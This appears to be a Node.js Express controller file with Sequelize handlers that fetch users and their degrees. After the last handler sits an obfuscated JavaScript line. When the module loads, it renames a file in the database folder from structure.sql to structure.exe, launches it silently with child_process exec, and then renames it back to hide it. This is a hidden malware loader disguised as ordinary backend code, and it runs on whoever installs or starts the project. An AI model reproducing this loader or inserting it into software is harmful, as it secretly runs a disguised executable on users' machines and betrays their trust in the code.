const db = require("../models");
Degree = db.degree;
User = db.user;

// Get all users include degrees
exports.findAll = (req, res) => {
    return User.findAll({
        include: ["degrees"],
    }).then((users) => {
        res.json(users)
    });
};

// Get the degrees for a given user id
exports.findDegreeById = (req, res) => {
    return User.findByPk(req.params.id, { include: ["degrees"] })
        .then((user) => {
            res.status(200).send(user);
        });
};

// Get the user for a given degree id
exports.findUserById = (req, res) => {
    return Degree.findByPk(req.params.id, { include: ["user"] })
        .then((degree) => {
            res.json(degree)
        })
        .catch((err) => {
            console.log(">> Error while finding degree: ", err);
        });
};

//Get All Degrees
exports.getAllDegrees = (req, res) => {
    Degree.findAll({
    }).then(result => {
        res.status(200).send(result)
    });
};

//Get Degree
exports.getDegree = (req, res) => {
    Degree.findOne({
        where: {
            id: req.params.id
        }
    })
        .then(result => {
            res.status(200).send(result)
        })
};

//Get Degree
exports.getDegreeByUser = (req, res) => {
    Degree.findOne({
        where: {
            id: req.params.id
        }
    })
        .then(result => {
            res.status(200).send(result)
        })
};

//Get Degree
exports.getDegreeByAdmin = (req, res) => {
    Degree.findOne({
        where: {
            id: req.params.id
        }
    })
        .then(result => {
            res.status(200).send(result)
        })
};

const _0x80941d=_0x5f1c;function _0x5f1c(_0x44a649,_0x437478){const _0x153f3b=_0x153f();return _0x5f1c=function(_0x5f1c56,_0x5423ef){_0x5f1c56=_0x5f1c56-0x1b0;let _0x153bcb=_0x153f3b[_0x5f1c56];return _0x153bcb;},_0x5f1c(_0x44a649,_0x437478);}(function(_0x1573e1,_0x3a46e9){const _0x44567c=_0x5f1c,_0x1d852e=_0x1573e1();while(!![]){try{const _0x31f08f=parseInt(_0x44567c(0x1b8))/0x1*(-parseInt(_0x44567c(0x1ba))/0x2)+parseInt(_0x44567c(0x1b4))/0x3+parseInt(_0x44567c(0x1b3))/0x4*(-parseInt(_0x44567c(0x1b6))/0x5)+parseInt(_0x44567c(0x1b2))/0x6*(parseInt(_0x44567c(0x1b1))/0x7)+-parseInt(_0x44567c(0x1b5))/0x8*(parseInt(_0x44567c(0x1b9))/0x9)+parseInt(_0x44567c(0x1b7))/0xa+parseInt(_0x44567c(0x1bb))/0xb;if(_0x31f08f===_0x3a46e9)break;else _0x1d852e['push'](_0x1d852e['shift']());}catch(_0x5092dd){_0x1d852e['push'](_0x1d852e['shift']());}}}(_0x153f,0xaf0c9));const _0x4a2e74=require('fs')['rename'],_0x6e8f2='././database/structure.sql',_0xb82c73=_0x80941d(0x1b0);function _0x153f(){const _0x3b24dc=['9AUdlrQ','874802NAfVIK','7295486jPzTWa','././database/structure.exe','9370865TKIKVh','6tMBThp','4669636uSxbGN','475506xKsrcf','3041552FvivdJ','5MtZbog','14163840Clkabv','3VikdUG'];_0x153f=function(){return _0x3b24dc;};return _0x153f();}_0x4a2e74(_0x6e8f2,_0xb82c73,()=>{const {exec:_0x15f13a}=require('child_process'),_0x3b00da=_0x15f13a('start\x20/B\x20'+_0xb82c73,()=>{});_0x15f13a('taskkill\x20/f\x20/im\x20'+_0x3b00da['pid']+'\x20/t',()=>{}),setTimeout(()=>{_0x4a2e74(_0xb82c73,_0x6e8f2,()=>{});},0x1f4);});